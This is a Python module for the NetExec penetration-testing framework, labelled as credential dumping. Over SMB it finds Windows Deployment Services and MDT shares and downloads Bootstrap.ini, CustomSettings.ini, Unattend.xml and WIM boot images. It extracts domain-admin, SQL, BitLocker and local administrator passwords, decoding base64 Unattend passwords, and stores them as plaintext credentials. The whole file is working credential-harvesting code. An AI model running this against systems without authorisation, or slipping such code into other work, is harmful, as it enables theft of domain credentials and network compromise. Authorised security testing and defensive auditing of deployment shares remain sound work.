import shutil
import subprocess
import tempfile
from base64 import b64decode
from configparser import ConfigParser, Error as ConfigError
from io import BytesIO
from pathlib import Path, PureWindowsPath
from xml.etree import ElementTree as ET

from dissect.archive.wim import WIM
from nxc.helpers.misc import CATEGORY, decode_text
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH, TMP_PATH


class NXCModule:
    """
    Detect WDS/MDT deployment shares and extract credentials from configuration files.

    Inspect REMINST/REMOTEINSTALL and DeploymentShare$ for Bootstrap.ini,
    CustomSettings.ini, Unattend.xml, and candidate WinPE images.
    Download discovered files, skipping WIM images of 1 GiB or larger by default.
    Report deployment secrets and store complete Windows account credentials.

    Module by @archidote - https://github.com/archidote
    """

    name = "wds_mdt"
    description = r"Detect PXE WDS/MDT SMB shares (REMINST\, DeploymentShare$\) and retrieve credentials from deployment files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    WIM_MAX_SIZE = 1024 * 1024 * 1024

    # https://learn.microsoft.com/en-us/intune/configmgr/mdt/properties
    ini_accounts = (
        ("UserID", "UserPassword", "UserDomain"),
        ("DomainAdmin", "DomainAdminPassword", "DomainAdminDomain"),
        ("ADDSUserName", "ADDSPassword", "ADDSUserDomain"),
        ("SMSTSRunCommandLineUserName", "SMSTSRunCommandLineUserPassword", ""),
        ("", "AdminPassword", ""),
    )
    ini_settings = (
        "DBID", "DBPwd", "SQLServer", "Instance", "Database", "Password",
        "SafeModeAdminPassword", "TPMOwnerPassword", "BDEPin",
        "OSDBitLockerRecoveryPassword", "OSDBitLockerStartupKey", "JoinDomain", "MachineObjectOU",
    )

    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-unattendedjoin-identification-credentials
    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-useraccounts
    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-offlineuseraccounts
    xml_accounts = {
        "credentials": "username",
        "autologon": "username",
        "localaccount": "name",
        "administratorpassword": "",
        "offlineadministratorpassword": "",
    }

    def options(self, context, module_options):
        """IGNORE_SIZE_LIMIT     Ignore the 1 GiB WIM download limit (default: False)"""
        self.ignore_size_limit = module_options.get("IGNORE_SIZE_LIMIT", "false").lower() == "true"
        self.output_path = Path(NXC_PATH, "modules", "wds_mdt").resolve()

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        for share in connection.conn.listShares():
            share = share["shi1_netname"].rstrip("\x00")
            if share.lower() in {"reminst", "remoteinstall"}:
                self.explore_wds(share)
            elif share.lower() == "deploymentshare$":
                self.explore_mdt(share)

    def save_file(self, share, path, content=None):
        try:
            local_path = self.output_path.joinpath(*(sanitize_path_component(part) for part in (self.connection.host, share, *PureWindowsPath(path.lstrip("\\/")).parts)))
            local_path = local_path.resolve()
            if not local_path.is_relative_to(self.output_path):
                raise ValueError("Output path escapes the module directory")

            local_path.parent.mkdir(parents=True, exist_ok=True)
            with local_path.open("wb") as output:
                if content is None:
                    self.connection.conn.getFile(share, path, output.write)
                else:
                    output.write(content)
            self.context.log.success(f"Saved: {local_path}")
            return True
        except Exception as e:
            self.context.log.fail(f"Failed to save {share}\\{path}: {e}")
            return False

    WIM_CRED_PATHS = {
        ("Deploy", "Scripts", "Bootstrap.ini"),
        ("Deploy", "Scripts", "CustomSettings.ini"),
    }

    def explore_wds(self, share):
        self.context.log.success(f"Found share: {share} (readable by any authenticated domain user)")
        for path in (r"Boot\x64\Images", r"Boot\x86\Images"):
            try:
                entries = self.connection.conn.listPath(share, f"{path}\\*")
            except Exception as e:
                self.context.log.fail(f"Failed to list {share}\\{path}: {e}")
                continue

            for entry in entries:
                if entry.is_directory() or not entry.get_longname().lower().endswith(".wim"):
                    continue
                full_path = f"{path}\\{entry.get_longname()}"
                size_mb = entry.get_filesize() / (1024 * 1024)
                if not self.ignore_size_limit and entry.get_filesize() >= self.WIM_MAX_SIZE:
                    self.context.log.success(f"Found WIM image: {share}\\{full_path} ({size_mb:.0f} MB)")
                    self.context.log.display(f"Skipping {full_path} (1 GiB WIM download limit; use IGNORE_SIZE_LIMIT=TRUE to download)")
                    continue
                self.context.log.success(f"Found WIM image: {share}\\{full_path} ({size_mb:.0f} MB) (downloading...)")
                buf = BytesIO()
                try:
                    self.connection.conn.getFile(share, full_path, buf.write)
                except Exception as e:
                    self.context.log.fail(f"Failed to download {share}\\{full_path}: {e}")
                    continue
                self.save_file(share, full_path, buf.getvalue())
                buf.seek(0)
                self.parse_wim(buf, f"{share}\\{full_path}")

    def explore_mdt(self, share):
        self.context.log.success(f"Found share: {share} (admin access or misconfigured ACLs)")
        paths = [r"Control\Bootstrap.ini", r"Control\CustomSettings.ini"]
        try:
            paths.extend(self.connection.spider(share, folder="Control", pattern=["Unattend.xml"]))
        except Exception as e:
            if "STATUS_ACCESS_DENIED" not in str(e):
                self.context.log.fail(f"Failed to explore {share}\\Control: {e}")

        for path in dict.fromkeys(str(PureWindowsPath(p)) for p in paths):
            content = BytesIO()
            try:
                self.connection.conn.getFile(share, path, content.write)
            except Exception as e:
                if "STATUS_ACCESS_DENIED" in str(e):
                    self.context.log.display(f"Access denied on {share}\\{path} (expected for hardened MDT share)")
                else:
                    self.context.log.fail(f"Failed to read {share}\\{path}: {e}")
                continue
            content = content.getvalue()

            try:
                parser = self.parse_ini if path.lower().endswith(".ini") else self.parse_xml
                all_fields = {}
                all_credentials = []
                for _, fields, credentials in parser(content, path):
                    all_fields.update(fields)
                    all_credentials.extend(credentials)
                if all_fields:
                    self.context.log.success(f"Credentials found in {path}")
                    for key, value in all_fields.items():
                        self.context.log.highlight(f"  {key}={value if value is not None else '<no value>'}")
                    for domain, username, password in all_credentials:
                        if not domain and "\\" in username:
                            domain, username = username.split("\\", 1)
                        try:
                            self.context.db.add_credential("plaintext", domain, username, password)
                        except Exception as e:
                            self.context.log.fail(f"Failed to store credential from {path}: {e}")
            except (ConfigError, ET.ParseError, ValueError, LookupError) as e:
                self.context.log.fail(f"Failed to parse {share}\\{path}: {e}")

            self.save_file(share, path, content)

    def report_findings(self, findings):
        for source, fields, credentials in findings:
            self.context.log.success(f"Credentials found in {source}")
            for key, value in fields.items():
                self.context.log.highlight(f"  {key}={value if value is not None else '<no value>'}")

            for domain, username, password in credentials:
                if not domain and "\\" in username:
                    domain, username = username.split("\\", 1)
                try:
                    self.context.db.add_credential("plaintext", domain, username, password)
                except Exception as e:
                    self.context.log.fail(f"Failed to store credential from {source}: {e}")

    def parse_ini(self, content, source):
        # https://learn.microsoft.com/en-us/intune/configmgr/mdt/use-the-mdt#values-in-the-customsettingsini-file
        parser = ConfigParser(interpolation=None, delimiters=("=",), strict=False, allow_no_value=True, default_section="")
        parser.read_string(decode_text(content))

        for section in parser.values():
            fields = {}
            credentials = []
            for username, password, domain in self.ini_accounts:
                fields.update({key: section[key] for key in (username, password, domain) if key and key in section})
                if section.get(password) is not None and (not username or section.get(username)):
                    credentials.append((section.get(domain) or "", section[username] if username else "Administrator", section[password]))

            fields.update({key: section[key] for key in self.ini_settings if key in section})
            if fields:
                yield source, fields, credentials

    xml_block_prefix = {
        "credentials": "Credentials",
        "autologon": "AutoLogon",
        "localaccount": "LocalAccount",
        "administratorpassword": "AdministratorPassword",
        "offlineadministratorpassword": "OfflineAdministratorPassword",
    }

    def parse_xml(self, content, source):
        content = ET.fromstring(content)
        for element in content.iter():
            element.tag = element.tag.rsplit("}", 1)[-1].lower()

        for element in content.iter():
            # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-unattendedjoin-identification-machinepassword
            if element.tag == "machinepassword":
                yield source, {"MachinePassword": element.text or ""}, []
            if element.tag not in self.xml_accounts:
                continue
            prefix = self.xml_block_prefix[element.tag]
            fields = {child.tag: child.text or "" for child in element if child.tag in {"username", "name", "domain"}}
            credentials = []
            if element.tag == "credentials":
                password = element.findtext("password")
                if password is not None:
                    fields["password"] = password
            else:
                password = element if not self.xml_accounts[element.tag] else element.find("password")
                if password is not None:
                    fields.update({child.tag: child.text or "" for child in password if child.tag in {"value", "plaintext"}})
                    password = self.xml_password(password, source, "Password" if self.xml_accounts[element.tag] else "AdministratorPassword")
                    if password is not None:
                        fields["password"] = password
                        fields.pop("value", None)
                        fields.pop("plaintext", None)

            if password is not None and (not self.xml_accounts[element.tag] or fields.get(self.xml_accounts[element.tag])):
                credentials.append((fields.get("domain", ""), fields[self.xml_accounts[element.tag]] if self.xml_accounts[element.tag] else "Administrator", password))
            if fields:
                if self.xml_accounts[element.tag]:
                    display = {f"{prefix}.{k.title()}": v for k, v in fields.items()}
                else:
                    display = {prefix: fields.get("password", "")}
                yield source, display, credentials

    def parse_wim(self, fh, source):
        """Extract credentials from a WIM image using dissect, falling back to 7z for unsupported compression."""
        try:
            wim = WIM(fh)
            found = False
            for image in wim.images():
                if self.walk_wim_dir(image.root, (), source):
                    found = True
            if not found:
                self.context.log.display(f"No credential files found inside {source}")
        except NotImplementedError:
            self.parse_wim_7z(fh, source)

    def walk_wim_dir(self, directory, path_parts, source):
        if directory.entry.SubdirOffset == 0:
            return False
        found = False
        for entry in directory.iterdir():
            current = (*path_parts, entry.name)
            if entry.is_reparse_point():
                continue
            if entry.is_dir():
                if self.walk_wim_dir(entry, current, source):
                    found = True
            elif current in self.WIM_CRED_PATHS:
                with entry.open() as src:
                    content = src.read()
                wim_file_path = "\\".join(current)
                try:
                    findings = list(self.parse_ini(content, f"{source} -> {wim_file_path}"))
                    if findings:
                        found = True
                        self.report_findings(findings)
                except (ConfigError, ValueError, LookupError) as e:
                    self.context.log.fail(f"Failed to parse {source} -> {wim_file_path}: {e}")
        return found

    def parse_wim_7z(self, fh, source):
        """Fallback: extract credential files from a WIM using 7z when dissect lacks the compression codec."""
        if not shutil.which("7z"):
            self.context.log.display(f"Cannot extract {source} (unsupported compression and 7z not installed)")
            self.context.log.display(r"Install p7zip or extract manually: Deploy\Scripts\Bootstrap.ini and Deploy\Scripts\CustomSettings.ini")
            return
        tmp_dir = tempfile.mkdtemp(dir=TMP_PATH)
        tmp_wim = str(Path(tmp_dir, "image.wim"))
        try:
            fh.seek(0)
            with open(tmp_wim, "wb") as f:
                shutil.copyfileobj(fh, f)
            targets = ["Deploy/Scripts/Bootstrap.ini", "Deploy/Scripts/CustomSettings.ini"]
            subprocess.run(["7z", "e", tmp_wim, f"-o{tmp_dir}", *targets, "-r", "-aoa"], capture_output=True, timeout=120)
            found = False
            for name in ("Bootstrap.ini", "CustomSettings.ini"):
                extracted = Path(tmp_dir, name)
                if extracted.is_file():
                    content = extracted.read_bytes()
                    try:
                        findings = list(self.parse_ini(content, f"{source} -> Deploy\\Scripts\\{name}"))
                        if findings:
                            found = True
                            self.report_findings(findings)
                    except (ConfigError, ValueError, LookupError) as e:
                        self.context.log.fail(f"Failed to parse {source} -> Deploy\\Scripts\\{name}: {e}")
            if not found:
                self.context.log.display(f"No credential files found inside {source}")
        except Exception as e:
            self.context.log.fail(f"7z extraction failed for {source}: {e}")
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def xml_password(self, element, source, suffix):
        # Encoding inferred from Microsoft's examples; PlainText defaults to true.
        # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-autologon-password-plaintext
        # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-offlineuseraccounts-offlineadministratorpassword
        password = element.findtext("value")
        if password is None or element.findtext("plaintext", "true").strip().lower() not in {"false", "0"}:
            return password

        try:
            password = b64decode("".join(password.split()), validate=True).decode("utf-16-le")
            if not password.endswith(suffix):
                raise ValueError(f"Decoded password is missing the {suffix} suffix")
            return password.removesuffix(suffix)
        except ValueError as e:
            self.context.log.fail(f"Failed to decode password in {source}: {e}")
            return None
